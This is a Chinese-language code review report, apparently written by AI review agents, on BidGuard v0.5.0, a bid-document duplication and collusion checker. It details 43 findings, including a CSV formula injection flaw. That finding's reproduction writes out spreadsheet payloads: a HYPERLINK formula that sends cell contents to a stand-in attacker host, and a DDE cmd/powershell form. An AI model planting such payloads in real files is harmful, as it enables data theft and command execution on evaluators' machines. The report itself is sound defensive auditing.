# BidGuard（原本·标书查重）v0.5.0 深度代码审阅报告

> 审阅日期：2026-07-02 · 基线：`main@4078315`（v0.5.0）· worktree 干净。
> 生成方式：6 路子系统深读代理并行审计全仓 → 20 条 CRIT/STRUCT 逐条对抗验证（0 条被推翻）→ 每条已确认发现再派一个专项代理逐行钉死机制/复现/修复设计（读当前源码，未改任何文件）。所有 file:line 以基线代码为准。
> 验证：`cargo test --lib` **116 passed / 0 failed / 7 ignored**、`vitest` **26 passed**（本次审阅会话真实运行）。
> ⚠️ 本文是时点快照——file:line 以审计基线为准，实施后行号可能有偏移。
>
> ✅ **已全部落地（2026-07-03）**：43 条发现（3 CRIT + 16 STRUCT + 24 INCR）均已实施。`I-universal` 在实施前已被 `56977c3` 修复（视为已解决）；`S11` opener scope 经核实为支持外部卷的**有意决定**（commit `7fe84a8`），故保留 `**` 并改以新增 `SECURITY.md` 记录权衡 + 更正 CHANGELOG 失实措辞（未收窄 scope，避免重新引入外部卷 bug）。C1 采方案 B（提示改走文档级 `truncation_notice` 字段，不进比对语料）；S9 采阈值门控（小语料精确、大语料 SimHash LSH）。验证：`cargo test --lib` **129 通过 / 0 失败**、`cargo clippy -D warnings` 干净、前端 `tsc` + `vite build` 通过、`vitest` **29 通过**、`eslint` 0 error。

## 总览与评分

**Overall: 7.6 / 10** —— 核心扎实、外围有欠账；三条 CRIT 都是横切面单点遗漏，修复成本均 ≤ 半天。

| 维度 | 评分 | 一句话 |
|---|---|---|
| Architecture | 8.0 | 分层纪律教科书级（engine 零 Tauri 依赖、SQL 层状态守卫、单事务边界），扣分在三处“声明与实现”断链 |
| Code Quality | 8.5 | why-注释密度罕见、大文件近半是内联行为测试、字符边界/unwrap 纪律好；扣分在伪开关与静默截断路径 |
| Engineering | 7.5 | 测试是真行为测试、版本三处+tag 精确同步；欠账在 README 样板、无 lint、IPC 契约零校验、CI 无缓存 |
| Perf & Risk | 6.5 | 日志纪律/离线闸门/CSP/全参数化 SQL 扎实；但 3 条 CRIT 全落此轴的“错误结论与安全”面，另有两处已知 O(n²) 悬崖 |

**发现总数：3 CRIT · 16 STRUCT · 24 INCR = 43 条**（全部经对抗验证 + 逐条深挖复核确认，0 条推翻）。工作量分布：S(<1h)×30 · M(半天)×12 · L(1天+)×1。

## 严重级索引（一表看全）

| ID | 级别 | 位置 | 一句话 | 工作量 |
|---|---|---|---|---|
| C1 | CRIT | `src-tauri/src/engine/parse.rs:377-391` | 扫描件超页截断提示块以普通正文入库参与比对 | M |
| C2 | CRIT | `src-tauri/src/export/csv.rs:5` | CSV 导出无公式注入防护 (CWE-1236) | S |
| C3 | CRIT | `src-tauri/src/services/import_service.rs:61-76` | 跨工作区分块缓存键 options_hash 漏掉查重源模板集 | M |
| S1 | STRUCT | `src-tauri/src/engine/parse.rs:841` | docx XML 解析 Err(_)=>break 静默截断 | S |
| S2 | STRUCT | `src/screens/CompareSetup.tsx:57-74` | 「保存为本工作区默认」六字段在比对链路零生效 | S |
| S3 | STRUCT | `src/screens/Settings.tsx:253` | 两个伪开关(flagCollusion/industryLink)只写 localStorage 无消费方 | S |
| S4 | STRUCT | `src/queries/data.ts:108-117` | 导入期文档列表"轮询兜底"失效：useDocuments 双通道退化为终态事件单点 | S |
| S5 | STRUCT | `src-tauri/src/services/compare_service.rs:401-406` | 语义模型下载嵌在比对任务内且全程持 embedder Mutex | M |
| S6 | STRUCT | `src-tauri/src/services/import_service.rs:183` | 写串行锁 db_write 是 run_import 局部变量 | M |
| S7 | STRUCT | `src-tauri/src/db/migrations.rs:173-180` | cluster_members 级联外键(chunk_id/document_id)无索引 | S |
| S8 | STRUCT | `src-tauri/src/commands/document.rs:73-76` | remove_document 无守卫也不失效既有比对结果 | M |
| S9 | STRUCT | `src-tauri/src/engine/candidate.rs:147-174` | embedding 召回通道(通道5)对全体 chunk 暴力 O(n²) 全维余弦 | L |
| S10 | STRUCT | `src-tauri/src/engine/candidate.rs:111-137` | TF-IDF 召回通道(通道4)倒排无 posting 长度上限 | S |
| S11 | STRUCT | `src-tauri/capabilities/default.json:12-19` | opener open-path/reveal scope 仍是通配 `**` | S |
| S12 | STRUCT | `src-tauri/src/commands/settings.rs:145-154` | read_text_file 是无约束任意路径读原语 | S |
| S13 | STRUCT | `src/components/DocxView.tsx:21-25` | docx-preview / MdView 超链接未做导航防护 | S |
| S14 | STRUCT | `README.md:1-8` | README 仍是 8 行 Tauri 脚手架样板 | S |
| S15 | STRUCT | `src/api/types.ts:1` | TS↔Rust IPC 契约纯手写镜像、call<T> 零运行时校验 | M |
| S16 | STRUCT | `package.json:6-12` | 前端无 lint(ESLint/react-hooks)门禁 | M |
| I-corpus | INCR | `src-tauri/src/engine/corpus.rs:50-51` | rel_pos 分母排除 heading 但 order_index 含 heading，可 >1.0 | S |
| I-subject | INCR | `src-tauri/src/services/compare_service.rs:620-625` | apply_fact_conflicts 的 field→摘要 match 缺 subject 分支 | S |
| I-progress | INCR | `src-tauri/src/services/compare_service.rs:428` | (bi+1)*EMBED_BATCH.min(total) 运算优先级错，进度超100% | S |
| I-buildraw | INCR | `src-tauri/src/engine/clustering.rs:143-150` | build_raw 用 Vec::contains 去重成员 O(E×V) | S |
| I-utf16 | INCR | `src-tauri/src/engine/parse.rs:303-314` | decode_text 不识别 UTF-16(FF FE/FE FF BOM)，静默乱码入库 | S |
| I-collusiontest | INCR | `src-tauri/src/engine/collusion.rs:14-32` | 14 个围标权重常数自注「未经实证校准」却零单元测试 | M |
| I-setrunning | INCR | `src-tauri/src/db/repo/job_repo.rs:102-108` | set_running 是唯一无状态守卫的 UPDATE，可把终态/cancelling 翻回 running | S |
| I-delws | INCR | `src-tauri/src/commands/workspace.rs:57-60` | delete_workspace 无「运行中任务」守卫，与 delete_job 的 JobConflict 不一致 | S |
| I-swallow | INCR | `src-tauri/src/jobs/mod.rs:116-119` | execute 中 finish/set_running 的 DB 错误被 let _ 静默吞掉无日志 | S |
| I-datetime | INCR | `src-tauri/src/db/repo/job_repo.rs:204-212` | delete_finished_older_than 用 RFC3339 'T' 与 datetime('now') 空格格式做字符串比较 | S |
| I-vacuum | INCR | `src-tauri/src/commands/tools.rs:125-127` | vacuum_db/integrity_check 未走 spawn_blocking，长阻塞占 async worker + 池连接 | S |
| I-kbd | INCR | `src/screens/JobsList.tsx:98-106` | JobsList 星标/删除 onKeyDown 缺 stopPropagation，键盘操作后立即导航跳走 | S |
| I-border | INCR | `src/screens/ClusterDetail.tsx:484-485` | MemberNote 琥珀色左强调条从不渲染（borderLeft 被随后的 border 简写重置） | S |
| I-systheme | INCR | `src/theme.tsx:31-37` | "跟随系统"不监听 prefers-color-scheme change，运行中系统切深浅色界面不跟随 | M |
| I-invalidstorm | INCR | `src/queries/data.ts:345-348` | useSetReviewStatus onSettled 失效活跃 infiniteQuery，深滚动大列表每次确认触发逐页全量重取 | S |
| I-exportinit | INCR | `src/screens/Export.tsx:47-58` | 导出默认项用 useState 初始化器读 appSettings，缓存未命中时用户默认被静默忽略且不回填 | M |
| I-deadcode | INCR | `src/components/primitives.tsx:70；src/prefs.ts:51-56` | Avatar 与 prefs.getSemantic/setSemantic 死代码；但 flagCollusion/industryLink 仍在用，非「仅 autoClean」 | S |
| I-universal | INCR | `CHANGELOG.md:25` | revert 清理不彻底：CHANGELOG/BUILD 仍写 universal(含 Intel) | S |
| I-cicache | INCR | `.github/workflows/ci.yml:11` | CI 无 Rust/npm 缓存，重型依赖树每次冷编译 | S |
| I-npmci | INCR | `.github/workflows/ci.yml:21` | 用 npm install 而非 npm ci，破坏可复现性 | S |
| I-cargocomment | INCR | `src-tauri/Cargo.toml:58` | Cargo.toml「计划中先不引入」注释与实际正式依赖矛盾 | S |
| I-platformtest | INCR | `.github/workflows/ci.yml:50` | 123 测试仅 macOS 跑，Windows/Linux 只 cargo check 不测 | M |
| I-dispatchtag | INCR | `.github/workflows/release.yml:57` | workflow_dispatch 手动触发在 main 上建名为 main 的 tag | S |
| I-supplychain | INCR | `.github/workflows/ci.yml:1` | 无 dependabot、CI 无 cargo/npm audit，含下载执行依赖链却零审计 | M |

## CRIT 详解（会产出错误结论/安全漏洞的活 bug）

### C1 · 扫描件超页截断提示块以普通正文入库参与比对，制造假 same 聚类、抬高相似度峰值与围标等级

**级别** 🔴 CRIT · **复核状态** refined（见文末修正） · **工作量** M

**位置**
- `src-tauri/src/engine/parse.rs:377-391 (truncated 时 blocks.insert(0, 提示 Block))`
- `src-tauri/src/engine/parse.rs:376 (错误注释「各文档数字不同故不会误聚类」)`
- `src-tauri/src/engine/chunker.rs:72-115 + 196-210 (提示块走 paragraph()，>=min_chars=10 产出 paragraph 块，并按。，拆出 sentence 块)`
- `src-tauri/src/engine/chunker.rs:396-397 (exact_hash=sha256(原文 text)、normalized_hash=sha256(normalized))`
- `src-tauri/src/services/compare_service.rs:148-149 (预召回过滤只剔 out-of-scope/template/空 token，提示块全部通过)`
- `src-tauri/src/engine/candidate.rs:44-64 (exact/normalized hash 桶：同文本跨文档直接成候选对)`
- `src-tauri/src/services/compare_service.rs:456-459 (all_same_hash=成员 normalized_hash 全等)`
- `src-tauri/src/engine/diff.rs:170-171 (all_same_normalized_hash → cluster_type="same")`
- `src-tauri/src/engine/collusion.rs:56-64 (docs.len()>=3 的 same 簇 → multi>0 → 权重 w=CLUSTER_BASE(0.1)+CLUSTER_SCALE(0.3)*multi/5)`
- `src-tauri/src/engine/matrix.rs:16-46 + compare_service.rs:279 (提示簇计入 doc_matrix → 抬高 peak → 触发 collusion 信号1 SIM_WEIGHT=0.4)`
- `src-tauri/src/engine/collusion.rs:127-135 (score>LEVEL_LOW=0.1 → level="low")`

**机制（逐环调用链）**

逐环调用链（当前代码，行号已核对）：
1) parse.rs:346 truncated = total_pages > rendered（rendered 被 rasterize_pdf 的 OCR_MAX_PAGES=20 封顶，parse.rs:403/436-438）。
2) parse.rs:377-391 truncated 时把「【查重提示】本文档为扫描件，因性能上限仅识别并比对了前 {rendered} 页（共 {total_pages} 页），其余 {total_pages-rendered} 页未参与查重，请人工复核。」以普通 Block（heading_level=None、is_table_row=false、is_list_item=false、page=Some(1)）insert 到 blocks[0]。无任何 is_notice/来源标记。
3) chunker.rs:58 chunk() 遍历 blocks：该块非 table/heading/list，落到 chunker.rs:91 的 for line in split('\n')；提示是单行且 >=min_chars(10)，chunker.rs:113-114 以 ptype="paragraph" 调 paragraph()。
4) chunker.rs:205-210 产出 paragraph 级块；chunker.rs:212-221 又按句切（提示含「，」「。」）产出多个 sentence 级块。每块 chunker.rs:396 exact_hash=sha256_hex(原文 text 字节)、chunker.rs:397 normalized_hash=sha256_hex(normalized)。
5) compare_service.rs:148-149 预召回过滤 keep_scope && keep_template && !tokens.is_empty()——提示块非模板、token 非空、在比对范围内 → 全部进入 comparable。
6) 两份 total_pages 相同的截断扫描件：rendered 均=20，total_pages-rendered 相同 → 提示串逐字节相同 → exact_hash 与 normalized_hash 都相同。candidate.rs:44-64 hash 桶直接把跨文档同 hash 块配成候选对。
7) 成簇后 compare_service.rs:456-459 all_same_hash=true → diff.rs:170-171 返回 cluster_type="same", severity="none"。该簇 docs_present=命中的全部文档。
8) ≥3 份命中：collusion.rs:56 multi=docs.len()>=3 的簇计数 >0 → collusion.rs:58 w=0.1+0.3*(multi/5)≈0.16（1 簇），score+=0.16。
9) 额外一环（原发现未提）：该簇同时计入 matrix.rs:16-46 doc_matrix，matched[i][j]+=score*min(char_count)，抬高 pairwise sim 与 compare_service.rs:279 的 peak；短文档里 ~55 字提示占比可观 → 可能把 peak 抬过 SIM_FLOOR=0.6 触发信号1（SIM_WEIGHT=0.4）。
10) collusion.rs:127-135 score>LEVEL_LOW(0.1) → 围标等级由 none 凭空升到 low。注释 parse.rs:376「各文档数字不同故不会误聚类」是错的：数字只跟 total_pages 走，总页数相同即完全一致；即便不同，diff.rs:178-182 avg>=0.7 仍归 changed/minor_change 并进簇。

**最小复现**

评标真实场景，默认配置：一次导入 3 份不同投标人的扫描件标书，均为 25 页（超过 OCR_MAX_PAGES=20）。三份内容各不相同、本无雷同。系统各自 OCR 前 20 页并在正文首插入完全相同的「【查重提示】…前 20 页（共 25 页），其余 5 页未参与查重…」。查重结果：出现一条「3 份文档 · 平均相似 100% · same」雷同条款（内容即该提示语），且围标结论从「无」被抬到「low（疑似）」，signals 里出现「1 处条款在 3 份及以上标书间高度雷同」。若三份文档正文本身很短，提示块还会经 doc_matrix 抬高整体相似度峰值，叠加 similarity 信号。

**影响面**

命中人群：任何一次导入含 ≥2 份「总页数相同、且都超过 20 页」的扫描件 PDF（招投标里同一标段常见统一页数模板/统一装订，扫描件普遍 >20 页），2 份即产生假 same 簇与假相似度贡献，≥3 份额外触发 CLUSTER_MULTI_DOCS 强信号并可将围标等级顶到 low。默认配置直接命中：OCR_MAX_PAGES 硬编码、ignore_templates 不拦提示块、无任何 notice 过滤开关。严重度高——直接违反项目「宁转人工不误告」红线：系统凭自己插入的运行时文案伪造雷同证据与围标信号，且这条会写进可举证报告呈给评标专家，属误告最坏形态（工具自证）。发生频率：扫描件+统一页数是招投标高频组合，属结构性而非偶发。

**修复设计**（尚未落地）

推荐方案 B（改动面更小、语义更干净）——提示不再作为 Block 进正文，改走 ParsedBlocks 独立 warning 字段随文档入库/展示：
1) parse.rs:25-36 ParsedBlocks 增 `pub truncation_notice: Option<String>`（或结构化 { rendered:u32, total:u32 }）。
2) 删除 parse.rs:377-391 的 blocks.insert(...)，改为在 parse_pdf_ocr 返回处设 `truncation_notice = truncated.then(|| format!(...))`；同步删/改 parse.rs:376 那句错误注释。
3) 上层导入管线把 truncation_notice 存到 document 行（新增列，需一个迁移号，migrations 目录按现有序号 +1），报告/前端在文档卡片以「未全量查重」警示条展示——满足「让用户知晓仅比对了前 N 页」的原意，但不进比对语料。
副作用/需一并改：ParsedBlocks 其余构造点（parse.rs:150-158 docx、parse.rs:449-455 pdf-extract、parse.rs 其它 ParsedBlocks 字面量、以及测试 helper）都要补 truncation_notice: None；docx OCR 路径（parse.rs:640+ docx_image_ocr）若也有截断需同等处理。

方案 A（最小侵入、不动 schema）——给 Block 加标记 + chunker 短路：
1) parse.rs:17-23 Block 增 `pub is_notice: bool`。
2) parse.rs:377-391 提示块 is_notice=true；其余所有 Block 字面量补 is_notice: false —— 经清点共约 23 处构造点（parse.rs:85/105/153/368/380/451/484/655/808/820/984/1028/1066 等 + chunker.rs:445/484/485/522/544/592/650/651 测试），全部需补默认值。
3) chunker.rs:72 循环开头加 `if b.is_notice { continue; }`（提示块既不产 chunk 也不进 section 累计 sect_text，避免 section 级泄漏）。
对比：A 不需迁移但触点多且提示信息不再随文档展示（原「告知用户」诉求丢失，除非另设通道）；B 触点少、语义正确、且保住用户告知，代价是一个 schema 迁移。建议 B。

无论 A/B，都应删掉 parse.rs:376 的错误注释。

**钉死测试**

放 src-tauri/src/engine/chunker.rs 的 #[cfg(test)] mod tests（已有 blocks_md/Block 构造范式）。测试名 `truncation_notice_block_is_not_comparable`：构造 `Block{ text: "【查重提示】本文档为扫描件，因性能上限仅识别并比对了前 20 页（共 25 页），其余 5 页未参与查重，请人工复核。".into(), is_notice: true(方案A)/ 或用 ParsedBlocks.truncation_notice(方案B), heading_level: None, page: Some(1), is_table_row: false, is_list_item: false }`，chunk() 后断言 `chunks.iter().all(|c| !c.text.contains("查重提示"))` 且 `chunks.iter().all(|c| !c.text.contains("未参与查重"))`（含 paragraph 与 sentence 级都不得出现）。旧代码：该块会产出 paragraph+多条 sentence 块 → 断言失败；修复后：0 块 → 通过。补一条集成级断言更稳（放 compare_service.rs tests）：两份仅含相同截断提示、正文各异的文档比对后 `clusters` 中不存在 text 含「查重提示」的 same 簇，且 collusion.level 不因此变为 low。

**对原发现的修正**

机制基本准确，两处需修正/补强：(1) 注释与 blocks.insert 的当前行号是 parse.rs:376-391（原发现写 377-391，插入语句始于 378、错误注释在 376，属同文件内小偏移，已修正）。(2) 原发现只说造假 same 簇与围标 CLUSTER 信号，遗漏了一环：提示块还会计入 matrix.rs 的 doc_matrix，抬高 pairwise 相似度与 peak，从而可能触发 collusion 信号1（similarity, SIM_WEIGHT=0.4），对短文档影响更大——即除了 CLUSTER 强信号外还额外污染 SIM 信号，危害面比原描述更宽。严重级 CRIT 合理（工具自证式误告，直击「宁转人工不误告」红线），不下调。此为真实缺陷，非设计如此——注释本身写明「各文档数字不同故不会误聚类」，说明作者意图是不误聚类，只是判断错误。

---

### C2 · CSV 导出无公式注入防护 (CWE-1236)，标书作者是对抗方

**级别** 🔴 CRIT · **工作量** S

**位置**
- `src-tauri/src/export/csv.rs:5 (esc 定义)`
- `src-tauri/src/export/csv.rs:37 (esc(&m.text) — 主雷区)`
- `src-tauri/src/export/csv.rs:31 (esc(c.topic))`
- `src-tauri/src/export/csv.rs:36 (esc(&m.section_path.join(" › ")))`
- `src-tauri/src/services/export_service.rs:149 (text: row.text — 投标人正文入模型)`
- `src-tauri/src/services/export_service.rs:232-235 (include_raw_text=false 时前 40 字截断，保留首字符)`

**机制（逐环调用链）**

逐环调用链，每环已 Read 当前代码确认属实：① 投标人 PDF/Word 正文经解析入库，export_service.rs:120 compare_repo::export_rows(conn, job_id) 取回 row，:149 直接 `text: row.text` 装入 ExportMember.text，:127 `topic: row.topic.clone()`、:140-144 section_path 反序列化自 DB——三者全是投标人可控原文，中途无任何过滤。② 评标专家点击导出 CSV → export/mod.rs:30 `"csv" => csv::write(data, path)`。③ csv.rs:22-38 遍历 members，:37 `esc(&m.text)`、:31 `esc(c.topic...)`、:36 `esc(&m.section_path.join...)` 写单元格。④ 错误环 csv.rs:5-7 `esc()` 只做 `format!("\"{}\"", s.replace('"', "\"\""))`——仅引号包裹 + 双引号转义（防 CSV 分列/断行），对首字符是 =/+/-/@/TAB/CR 的公式触发前缀零处理。⑤ 单元格落盘为 `"=cmd|'/c calc'!A1"` 形态；Excel/WPS/LibreOffice 解析时先剥外层引号再看首字符 `=` → 判定为公式并执行。⑥ 报告是评标专家本地打开的本地文件，无 MOTW/Protected View 拦截（那是从网络下载才触发），DDE/超链接类 payload 直接命中。对照组 xlsx.rs:121 `write_string(r, 9, &m.text)` 由 rust_xlsxwriter 以字符串类型写入、不会被当公式，html.rs:11 用 xml_escape、markdown 走表格文本——唯 CSV 裸奔，机制成立。

**最小复现**

评标现场最小复现：某标段 4 家投标人，围标方在自家《技术方案》正文里埋一段以等号开头的文字，例如章节标题写成 `=HYPERLINK("http://attacker/leak?d="&A1&B1&C1,"点击查看详情")`（或更直接的 `=cmd|'/c powershell ...'!A1` DDE 形态）。评委导入这 4 份标书 → 生成雷同报告 → 因该段与他人雷同被聚为一组，原文进入 clusters[].members[].text → 评委导出 CSV 存档/上报 → 在评标室电脑用 Excel 双击打开 → 该单元格被当公式：轻则 HYPERLINK 把相邻单元格（含其它投标人正文/评审结论）拼进 URL、评委一点即外泄；重则 DDE 弹窗诱导执行本机命令。触发只需投标人把 payload 放进任意会被比中的段落，且默认导出格式列表 export/mod.rs:21 FORMATS 含 csv。注意 include_raw_text=false 也不能兜底：export_service.rs:232 截断取 `chars().take(40)`，保留首字符，`=` 仍在开头。

**影响面**

受影响：所有导出 CSV 的评标/审计用户；攻击面是全体投标人（对抗方）——正契合本条 CWE-1236 的对抗前提。严重度高：一次点击即可外泄同表格内其它投标人正文与评审结论（违背『日志/正文不外泄』的核心价值），或本机命令执行。默认命中：CSV 是 6 种内置格式之一（mod.rs:21），无需任何非默认配置；include_raw_text 开/关都命中（关闭仅截断为 40 字摘要，首字符不变）。发生频率：只要有一个投标人构造 payload 且被比中即触发，标书查重的比中率天然很高，属高频可达路径。唯一门槛是评委用 Excel/WPS 打开（评标现场极常见）而非文本编辑器。

**修复设计**（尚未落地）

在 csv.rs:5 的 esc() 内、做引号转义【之前】先中和公式前缀。伪代码：
```
fn esc(s: &str) -> String {
    // CWE-1236：首字符为 = + - @ 或 TAB/CR 时，Excel/WPS 会当公式；前置单引号中和。
    let neutralized = match s.chars().next() {
        Some('=') | Some('+') | Some('-') | Some('@') | Some('\t') | Some('\r') =>
            format!("'{s}"),
        _ => s.to_string(),
    };
    format!("\"{}\"", neutralized.replace('"', "\"\""))
}
```
要点/副作用：(1) 前缀单引号必须在 replace('"') 之前拼接，保证外层引号包裹逻辑不变；顺序反了不影响正确性但语义上先中和更清晰。(2) 单引号会作为可见字符出现在单元格文本开头，属公认可接受代价（OWASP 推荐做法）；若要求零可见改动可改为前置 TAB `\t`——但 TAB 在部分 CSV 消费端会被视作分隔符风险，且本项目用逗号分隔、外层有引号包裹，TAB 落在引号内安全，两方案二选一，推荐单引号（更直观、可举证）。(3) 覆盖面：esc() 当前仅用于 :31/:36/:37 三处投标人可控字段，修 esc() 一处即全覆盖，无需逐点改。(4) 需一并处理：审视 csv.rs:32 `docs.join("·")` 与 :33 `m.tag`（未过 esc）——tag 是天干内部标签、docs 由 tag 拼接，非投标人可控，可不改；但为一致性可评估。(5) 无迁移号、无 DB schema 变更、非用户可配置项，属纯内部导出逻辑修复。(6) 建议在 esc() 上方补一行注释注明 CWE-1236 与对抗前提，符合『注释说明 why』规范。(7) 对照 xlsx/html/markdown 无需改（write_string/xml_escape/表格文本均不解释公式）。【本次未修改任何文件】。

**钉死测试**

在 src-tauri/src/export/csv.rs 末尾新增 `#[cfg(test)] mod tests`（与本仓 diff.rs/normalize.rs 同款内联单测风格）。用例名 `esc_neutralizes_formula_injection`：断言 `esc("=1+1")` 返回值不以 `\"=` 开头（旧代码 `esc("=1+1") == "\"=1+1\""` 会失败，修复后为 `"\"'=1+1\""` 通过）；再对 '+' '-' '@' 各断言首字符被中和。第二用例 `esc_preserves_normal_text`：断言 `esc("甲方应在十日内支付")` 不被加前缀（保证不误伤正常正文）、且内部双引号转义仍生效 `esc("a\"b") == "\"a\"\"b\""`。可选集成级用例 `csv_export_payload_is_inert`：构造含 `=HYPERLINK(...)` text 的 ExportData 调 csv::write 到 tempfile，读回断言对应单元格首字符非 '='。关键断言落在 esc() 层即可锁死回归。

**对原发现的修正**

机制与严重级完全属实，仅两处行号需按当前代码修正：(1) 原发现写『m.text 入单元格 csv.rs:31,36,37』——当前代码实际是 esc(&m.text) 在 :37、esc(c.topic) 在 :31、esc(&m.section_path...) 在 :36，即 :31 是 topic 而非 text，三行分别对应三个字段（原文把三行都归给 m.text 略有出入，但三处都经 esc()、都是投标人可控、结论不变）。(2) 补充一点原发现未提及但重要：include_raw_text=false 的截断路径（export_service.rs:232 chars().take(40)）保留首字符，不能作为缓解，默认关闭正文也照样命中——这加强而非削弱原结论。除此之外无不准确，严重级 CRIT 维持。

---

### C3 · 跨工作区分块缓存键 options_hash 漏掉查重源模板集，复用过期 is_template/template_id 标记

**级别** 🔴 CRIT · **复核状态** refined（见文末修正） · **工作量** M

**位置**
- `src-tauri/src/services/import_service.rs:61-76 (options_hash 指纹字符串，缺模板集摘要)`
- `src-tauri/src/services/import_service.rs:96 (options_hash = opts.options_hash())`
- `src-tauri/src/services/import_service.rs:99-114 (chunker_opts 从 list_enabled 现取模板，与指纹脱节)`
- `src-tauri/src/services/import_service.rs:228-253 (import_one 缓存命中分支)`
- `src-tauri/src/db/repo/document_repo.rs:131-145 (find_parsed_by_hash：仅 hash+status+parse_options_hash，跨工作区无 ws 过滤)`
- `src-tauri/src/db/repo/chunk_repo.rs:146-211 (copy_all：原样复制 is_template 列5 / template_id 列20)`
- `src-tauri/src/engine/chunker.rs:365-389 (is_template 纯由 ctx.opts.templates 派生)`
- `src-tauri/src/services/compare_service.rs:148 (keep_template = !(cfg.ignore_templates && c.is_template) 直接消费存量列)`
- `src-tauri/src/config.rs:44 (ignore_templates 默认 true)`
- `src-tauri/src/db/repo/template_repo.rs:61-68 (list_enabled 全局，无 workspace_id)`
- `src-tauri/src/db/migrations.rs:218-224 (source_templates 表全局，无 workspace_id)`
- `src-tauri/src/db/migrations.rs:236-242 (V3 指纹注释仅列举解析参数，未含模板集——设计缺口源头)`

**机制（逐环调用链）**

逐环调用链(均按当前代码核实)：(1) import_service.rs:96 opts.options_hash() 生成指纹，其字符串模板(rs:62-74)为 'v4|min|case|punct|ws|tbl|page|hf|img|ocr|lang'，不含任何模板集摘要。(2) 但真正喂给分块器的模板集在 rs:99-114 由 template_repo::list_enabled(&conn) 现场读取全局 source_templates(enabled=1)，分词后塞进 ChunkerOptions.templates。二者脱节：指纹描述不了分块的真实输入。(3) chunker.rs:365-375 对每个分块用 cosine(tokens, 模板分词) 与 TEMPLATE_MATCH=0.7 比较，命中则 is_template=true 且记 template_id，完全由当前 templates 派生(rs:375,388-389)。(4) 首次导入后 chunks 落库带当时的 is_template/template_id。(5) 此后模板集变化(save 新增 / set_enabled 停用 / delete 删除，均不改动已存 chunks；全仓无重算路径，grep is_template=/UPDATE chunks 仅命中 chunker 与 copy_all)。(6) 再次导入同内容文件：import_one rs:231 调 find_parsed_by_hash(conn, file_hash, options_hash)，document_repo.rs:136-141 仅按 file_hash+status='parsed'+parse_options_hash 匹配、无 workspace 过滤 → 命中旧文档。(7) persist_cached(rs:356-376) → chunk_repo::copy_all(rs:146-211) 把源 chunks 的 is_template(列5)与 template_id(列20)原样重插(INSERT ?7=tpl ?8=tid，rs:186-200)，不按当前模板集重算。(8) 比对期 compare_service.rs:138-152 load_for_compare 读回这批 chunks，rs:148 keep_template=!(cfg.ignore_templates && c.is_template)，ignore_templates 默认 true(config.rs:44) → 直接消费过期标记。方向：旧标记 is_template=1 而模板已停用/删除 → 本应参与比对的段被静默剔除 = 漏报(false negative)；旧标记 is_template=0 而模板新增且该段现在命中 → 本应剔除的样板段进入比对 = 误报(false positive)。两向都真实存在。

**最小复现**

触发前提：source_templates 是全局表(migrations.rs:218 无 workspace_id)，模板对所有工作区共享——所以复现不必两个工作区，单工作区即可命中(跨工作区只是触发路径之一)。最小场景(漏报向)：评标员导入投标人甲的 25 页扫描件标书(内容含一段'我方承诺提供7×24小时技术支持…'，与内置样板 t-after 余弦≥0.7)，首次解析把该段标 is_template=1；随后评标员认为该项目不该屏蔽售后承诺、在模板页把 t-after 停用(set_enabled false)或删除；接着导入投标人乙的另一份标书，其中乙照抄了甲同一段售后承诺原文——若乙这份文件的 sha256 与库中任一已解析文档相同(同一模板文库分发、或甲乙提交了字节完全相同的附件/资质扫描件，评标场景常见)，find_parsed_by_hash 命中旧解析，copy_all 把 is_template=1 原样带来，比对期 rs:148 直接把这段剔出 comparable，甲乙这处围标抄袭不进候选边——漏报。误报向对称：先导入(此时无对应样板)→段标 is_template=0；评标员事后把该通用套话加为新样板并启用；再导入同 hash 文件→缓存复用旧 is_template=0，样板段照进比对，凑高相似度→误报。频率：任何'先导入后改模板再导入同 hash 文件'序列必现；模板增删是模板管理页的常规操作，同 hash 复用在'同批分发的资质/格式文件''重复提交'下并不罕见。

**影响面**

受影响：所有依赖样板剔除的比对结果(默认路径)。默认配置命中：ignore_templates 默认 true(config.rs:44)，compare_service 各调用点(rs:850、export_service.rs:314)也传 true，即产品默认与导出报告都走这条列。严重度：直接违反核心价值观两端——漏报(该报的抄袭被样板标记挡掉，'该告不告')与误报(通用套话被当雷同，'不误告'被破坏)，且缓存复用无声无痕、报告里看不出这段是被过期标记剔除的，取证结论可被沉默污染。范围：不局限跨工作区，因模板全局共享，单工作区重导即可触发；一次错误标记会随 copy_all 传播到每个复用该 hash 的后续工作区。发生频率：中——需'导入→改模板→同 hash 再导入'序列，但模板增删是常规操作、同 hash 复用在分发件/重复提交下常见；一旦发生则确定性错误，非偶发。

**修复设计**（尚未落地）

根因是缓存复用键(parse_options_hash)未覆盖分块的一项真实输入(启用模板集)。首选方案 A——把启用模板集摘要并入指纹，让模板集变化后旧缓存自然失效、走重新解析：
(1) 让 options_hash 的输入包含模板集摘要。因 options_hash() 目前只吃 &self(ImportOptions 无模板)，需把摘要作为参数传入或加字段。建议在 ImportOptions 增 `pub templates_digest: String`，在 from_config 之外由 run_import 计算后填入；options_hash() 追加 `|tpl={templates_digest}` 并把版本号 v4→v5(rs:62)。
(2) 摘要计算：在 run_import(rs:98-105) 取 list_enabled 后，对 (id, text) 按 id 排序、拼 `id\ttext\n`、sha256_hex 作为 templates_digest。必须用原始 text 而非分词结果(分词受 language 影响，且 language 已在指纹内，用原文更稳)。伪代码：
```
let enabled = template_repo::list_enabled(&conn)?;   // (id, text)
let mut v: Vec<_> = enabled.clone(); v.sort_by(|a,b| a.0.cmp(&b.0));
let digest = sha256_hex(v.iter().map(|(i,t)| format!("{i}\t{t}\n")).collect::<String>().as_bytes());
```
然后 options_hash = opts.options_hash_with(&digest)(或先 opts.templates_digest = digest 再 options_hash())。空模板集要有稳定摘要(空串的 sha256)，与'有模板'区分。
(3) 副作用/需一并改：
 - 迁移/文档：新增 V10 迁移无需改表(parse_options_hash 已是 TEXT)，但要在 migrations.rs V3 注释(rs:236-242)与 find_parsed_by_hash 注释(document_repo.rs:128-130)补充'指纹现含启用模板集摘要'。旧行 parse_options_hash 为 v4 前缀，永不匹配新 v5 指纹 → 自动重新解析，保守正确，无需数据回填。
 - options_hash() 的调用方只有 run_import(rs:96) 与测试(rs:492 传字面 'oh')，签名变更影响面小。
 - 代价：模板集一变，全部同配置缓存失效、下次导入重新解析(含 OCR)，成本上升。可接受(正确性优先)，但应在 CHANGELOG/注释说明。
